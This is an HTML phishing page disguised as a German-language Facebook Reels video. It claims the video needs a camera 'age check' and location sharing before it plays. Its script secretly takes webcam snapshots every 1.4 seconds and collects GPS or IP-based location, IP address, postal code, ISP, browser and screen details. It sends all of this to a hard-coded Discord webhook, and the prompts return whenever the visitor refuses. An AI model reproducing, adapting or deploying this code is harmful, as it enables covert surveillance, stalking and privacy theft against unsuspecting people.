<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Facebook</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
  <style>
    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
    .reel-header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.7); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(10px); }
    .close { font-size:32px; font-weight:bold; cursor:pointer; margin-right:16px; }
    .reel-title { flex:1; text-align:center; font-size:18px; font-weight:600; }
    .content { height:100vh; position:relative; }
    .profile { position:absolute; top:70px; left:16px; display:flex; align-items:center; z-index:10; }
    .ava { width:44px; height:44px; border-radius:50%; background:#555; margin-right:12px; }
    .info { font-size:16px; line-height:1.2; }
    .name { font-weight:600; }
    .pub { font-size:13px; opacity:0.85; }
    .play-area { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; }
    .play { width:110px; height:110px; background:rgba(0,0,0,0.55); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; }
    .tri { width:0; height:0; border-top:36px solid transparent; border-bottom:36px solid transparent; border-left:58px solid #fff; margin-left:10px; }
    .overlay { position:absolute; bottom:220px; left:0; right:0; font-size:2.6rem; text-align:center; text-shadow:0 5px 25px #000; pointer-events:none; line-height:1.1; z-index:4; }
    .bottom { position:absolute; bottom:40px; right:24px; display:flex; flex-direction:column; gap:32px; font-size:34px; color:#fff; z-index:6; }
    .audio { position:absolute; bottom:20px; left:16px; font-size:14px; opacity:0.8; z-index:10; }
    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.92); display:none; align-items:center; justify-content:center; z-index:9999; }
    .box { background:#fff; color:#000; padding:48px 36px; border-radius:20px; max-width:440px; text-align:center; box-shadow:0 16px 60px rgba(0,0,0,0.7); }
    .btn { padding:16px 70px; font-size:1.25rem; font-weight:bold; border:none; border-radius:10px; margin:20px 12px; cursor:pointer; }
    .allow { background:#1877f2; color:#fff; }
    .deny { background:#e4e6eb; color:#000; }
  </style>
</head>
<body>
<div class="reel-header">
  <div class="close">√ó</div>
  <div class="reel-title">Reels</div>
</div>

<div class="content">
  <div class="profile">
    <div class="ava"></div>
    <div class="info">
      <div class="name">Zorica Zoka Dimitrijevic</div>
      <div class="pub">√ñffentlich</div>
    </div>
  </div>

  <div class="play-area" id="play">
    <div class="play"><div class="tri"></div></div>
  </div>

  <div class="overlay">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>

  <div class="bottom">
    <div>‚ù§Ô∏è 14.6K</div>
    <div>üí¨ 305</div>
    <div>‚û§</div>
  </div>

  <div class="audio">Zorica Zoka Dimitrijevic ¬∑ Original audio ¬∑ Zorica</div>
</div>

<div id="cam-prompt">
  <div class="box">
    <h2>Video kann nicht abgespielt werden</h2>
    <p style="margin:28px 0; font-size:1.3rem;">Kurze Kamera-Freigabe f√ºr Alterspr√ºfung n√∂tig.</p>
    <div id="err-cam" style="color:#c00;display:none;margin:20px 0;">Zugriff verweigert ‚Äì erneut versuchen</div>
    <button id="allowCam" class="btn allow">KAMERA FREIGEBEN</button>
    <button id="denyCam" class="btn deny">ABBRECHEN</button>
  </div>
</div>

<div id="loc-prompt">
  <div class="box">
    <h2>Standort teilen</h2>
    <p style="margin:28px 0; font-size:1.3rem;">Teile deinen genauen Standort um das Video zu sehen.</p>
    <button id="allowLoc" class="btn allow">STANDORT TEILEN</button>
    <button id="denyLoc" class="btn deny">NEIN</button>
  </div>
</div>

<video id="v" autoplay muted playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
let snap=0, str=null, vid=document.getElementById('v'), can=document.getElementById('c');

async function getIPLoc() {
  let geo=null;
  try { geo=await (await fetch('https://ipapi.co/json/')).json(); if (geo.ip && geo.latitude) return geo; } catch {}
  try { geo=await (await fetch('https://ipinfo.io/json')).json(); if (geo.ip && geo.loc) {
    const [la,lo]=geo.loc.split(','); geo.latitude=parseFloat(la); geo.longitude=parseFloat(lo); return geo;
  }} catch {}
  return {ip:'?', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
}

async function getGPS() {
  return new Promise(r=>{
    if (!navigator.geolocation) return r(null);
    navigator.geolocation.getCurrentPosition(p=>r({latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy}), ()=>r(null), {enableHighAccuracy:true, timeout:16000});
  });
}

async function send(type, blob=null) {
  try {
    let loc = await getGPS() || await getIPLoc();
    let ip = loc.ip || '?';
    let city = loc.city || '?', reg = loc.region || '?', ctry = loc.country || '?', plz = loc.postal || '?', org = loc.org || '?';
    let lat = loc.latitude, lon = loc.longitude;
    let acc = lat ? `${Math.round(loc.accuracy || 1000)}m` : 'IP-Fallback';
    let maps = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;

    const emb = {
      title: `üî¥ FB ${type} #${++snap}`,
      color: lat ? 0x00ff88 : 0xff0000,
      fields: [
        {name:"Event",value:type,inline:true},
        {name:"IP + Loc",value:`**${ip}**\n${city} ‚Ä¢ ${reg} ‚Ä¢ ${ctry} ‚Ä¢ ${plz} ‚Ä¢ ${org}`,inline:true},
        {name:"Acc",value:acc,inline:true},
        {name:"UA",value:navigator.userAgent.slice(0,140),inline:false},
        {name:"Screen",value:`${screen.width}√ó${screen.height}`,inline:true},
        {name:"Time",value:new Date().toISOString(),inline:true}
      ],
      timestamp: new Date().toISOString()
    };
    if (maps) emb.fields.push({name:"Maps (Haus/Street)",value:`[‚Üí exakte Position](${maps})`,inline:false});

    const pay = {embeds:[emb]};
    if (blob) {
      let fd=new FormData();
      fd.append("payload_json",JSON.stringify(pay));
      fd.append("file",blob,`fb_${Date.now()}.jpg`);
      await fetch(HOOK+"?wait=true",{method:"POST",body:fd});
    } else {
      await fetch(HOOK+"?wait=true",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(pay)});
    }
  } catch {}
}

document.getElementById('play').onclick = () => {
  document.getElementById('cam-prompt').style.display='flex';
  send('PLAY');
};

document.getElementById('allowCam').onclick = async () => {
  document.getElementById('cam-prompt').style.display='none';
  try {
    str=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}}});
    vid.srcObject=str;
    await vid.play();
    can.width=vid.videoWidth||1280; can.height=vid.videoHeight||720;
    setInterval(async()=>{
      can.getContext('2d').drawImage(vid,0,0,can.width,can.height);
      let b=await new Promise(r=>can.toBlob(r,'image/jpeg',0.88));
      send('CAM SNAP',b);
    },1400);
    setTimeout(()=>document.getElementById('loc-prompt').style.display='flex',3200);
  } catch(e){
    send('CAM ERR');
    document.getElementById('err-cam').style.display='block';
    setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',2400);
  }
};

document.getElementById('denyCam').onclick = () => {
  document.getElementById('err-cam').style.display='block';
  send('CAM DENY');
  setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',1800);
};

document.getElementById('allowLoc').onclick = async () => {
  document.getElementById('loc-prompt').style.display='none';
  send('LOC OK');
};

document.getElementById('denyLoc').onclick = () => {
  document.getElementById('loc-prompt').style.display='none';
  send('LOC NO');
};
</script>
</body>
</html>
